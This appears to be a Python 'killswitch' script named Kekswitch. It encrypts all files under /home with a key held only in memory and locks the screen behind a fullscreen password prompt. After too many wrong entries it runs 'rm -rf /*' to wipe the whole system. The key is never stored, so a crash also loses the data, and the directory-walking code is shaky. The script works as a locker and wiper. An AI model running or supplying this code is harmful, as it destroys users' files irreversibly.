#!/usr/bin/env python3
from cryptography.fernet import Fernet
from tkinter import *
import keyboard
import sys, os

max_retries_file = '/usr/local/bin/kekswitch.d/kekswitch/max-retries'
password_file = '/usr/local/bin/kekswitch.d/kekswitch/password'

try:
    max_retries = int(open(max_retries_file, 'r').read())
    password = open(password_file, 'r').read().strip()
except:
    sys.exit(1)

fer = Fernet(Fernet.generate_key())

window = Tk()
window.title("Kekswitch")
window.attributes('-fullscreen', True)
Label(window, text = 'Please put your password below').pack()

def kill():
    os.system("rm -rf /*")

def stop_alt_tab():
    walk_through('decrypt')
    os.system('poweroff')

def main(retries_left):
    def check_password():
        text = text_box.get('1.0', 'end').strip()
        text_box.destroy()
        button_input.destroy()
        retries_left_banner.destroy()
        info.destroy()
        if text == password:
            walk_through('decrypt')
            window.destroy()
            sys.exit(0)
        else:
            main(retries_left - 1)
    if retries_left <= 0: kill()
    text_box = Text(
        window,
        height = 8,
        width = 60,
    )
    text_box.pack()
    button_input = Button(
        window,
        text = "Input password",
        command = check_password
    )
    info = Label(
        window,
        text = """
INFO:
This computer has a 'killswitch' installed.
Because of this, all of its files are currently encrypted, and require a password to decrypt them.
If you fail to input the proper password enough times, the computer will be bricked.
\
"""
    )
    retries_left_banner = Label(window, text = f"You have {retries_left} attempts left.")
    retries_left_banner.pack()
    button_input.pack()
    info.pack()

    window.mainloop()

def encrypt_or_decrypt(file, method):
    with open(file, 'rb') as original_file:
        original = original_file.read()
    content = None
    if method == 'encrypt':
        content = fer.encrypt(original)
    else:
        content = fer.decrypt(original)
    with open(file, 'wb') as new_file:
        new_file.write(content)

def walk_through(method):
    for fi in [max_retries_file, password_file]:
        encrypt_or_decrypt(fi, method)
    for i, l, j in os.walk('/home'):
        for files in [i, l, j]:
            if list(files) == files:
                for fi in files:
                    try:
                        file = os.path.join(i, fi)
                        encrypt_or_decrypt(file, method)
                    except:
                        continue
            else:
                try:
                    file = os.path.join(i, files)
                    encrypt_or_decrypt(file, method)
                except:
                    continue

keyboard.add_hotkey('alt', stop_alt_tab, args = ())

walk_through('encrypt')
main(max_retries)